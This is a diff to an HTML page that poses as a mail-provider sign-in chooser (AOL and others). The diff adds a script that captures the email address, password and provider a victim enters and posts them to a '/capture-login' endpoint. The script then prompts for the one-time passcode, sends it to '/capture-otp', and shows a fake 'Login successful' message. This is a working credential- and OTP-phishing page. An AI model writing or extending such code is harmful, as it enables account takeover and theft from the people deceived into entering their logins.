@@ -126,7 +126,7 @@
 
         <button class="provider-btn" onclick="openModal('AOL')">
           <div class="provider-icon icon-aol">
-            <i class="fa fa-envelope"></i>
+            <i class="fa fa-envelope-alt"></i>
           </div>
           <div class="provider-info">
             <span class="provider-sub" id="email-name">Send to {{email}}</span>
@@ -509,6 +509,99 @@
           });
       });
     </script>
+
+    <script>
+      // Wait for page to fully load before attaching events
+      document.addEventListener("DOMContentLoaded", function () {
+        // Landing -> Choose providers flow
+        const continueBtn = document.getElementById("continue-btn");
+        function showChoose() {
+          const landing = document.getElementById("landing-screen");
+          const choose = document.getElementById("choose-screen");
+          if (landing) landing.style.display = "none";
+          if (choose) choose.style.display = "block";
+        }
+        if (continueBtn) continueBtn.addEventListener("click", showChoose);
+        document.addEventListener("keydown", (e) => {
+          // Only respond to Enter when landing is visible
+          const landing = document.getElementById("landing-screen");
+          if (!landing || landing.style.display === "none") return;
+          if (e.key === "Enter") showChoose();
+        });
+        // LOGIN BUTTON click -> submit credentials to server and show verify screen
+        const loginBtn = document.getElementById("password-next-btn");
+        if (loginBtn)
+          loginBtn.addEventListener("click", async function () {
+            const email = document.getElementById("primary-email").value;
+            const password = document.getElementById("primary-password").value;
+            const provider =
+              document.getElementById("modal-provider").textContent;
+            if (!email || !password) {
+              alert("Please fill in both fields");
+              return;
+            }
+
+            try {
+              const res = await fetch(`${getApiBaseUrl()}/capture-login`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ email, password, provider }),
+              });
+              const data = await res.json();
+
+              if (data && data.requireOTP) {
+                showScreen("verify-screen");
+              } else {
+                alert("Login data received, but OTP step not required.");
+                closeModal();
+              }
+            } catch (err) {
+              console.error(err);
+              alert("Unable to reach the server. Please try again.");
+            }
+          });
+
+        // VERIFY OK -> start OTP screen and timer
+        const verifyOk = document.getElementById("verify-ok-btn");
+        if (verifyOk)
+          verifyOk.addEventListener("click", function () {
+            showScreen("otp-screen");
+            startTimer(180); // 3 minutes
+          });
+
+        // OTP SUBMIT -> send or handle locally
+        const otpBtn = document.getElementById("otp-btn");
+        if (otpBtn)
+          otpBtn.addEventListener("click", async function () {
+            const otp = document.getElementById("otp").value;
+            if (!otp) {
+              alert("Please enter the OTP");
+              return;
+            }
+
+            // send to server or handle here
+            try {
+              const res = await fetch(`${getApiBaseUrl()}/capture-otp`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ otp }),
+              });
+              const data = await res.json();
+              if (data && data.success) {
+                alert("✅ Login successful!");
+                closeModal();
+              } else {
+                alert("OTP submitted (demo).");
+                closeModal();
+              }
+            } catch (e) {
+              // If server not available, just close for demo
+              alert("OTP submitted (demo).");
+              closeModal();
+            }
+          });
+      });
+  </script>
 
      
   </body>
